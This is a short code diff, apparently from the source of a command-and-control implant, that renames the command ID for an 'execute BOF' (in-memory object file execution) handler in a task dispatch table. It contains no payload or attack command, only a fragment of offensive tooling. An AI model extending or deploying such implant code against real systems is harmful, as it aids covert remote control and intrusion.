@@ -166,7 +166,7 @@ SECTION_CODE void init_task_ptrs()
         {.cmd_id = CMD_AGENTINFO_MESSAGE, .cmd_ptr = FUNC_OFFSET(cmd_agentinfo)},    
 #endif
 #ifdef INCLUDE_CMD_EXECUTE_BOF
-        {.cmd_id = CMD_EXECUTE_BOF, .cmd_ptr = FUNC_OFFSET(cmd_bof)},
+        {.cmd_id = CMD_EXECUTE_BOF_MESSAGE, .cmd_ptr = FUNC_OFFSET(cmd_bof)},
 #endif
     };
 
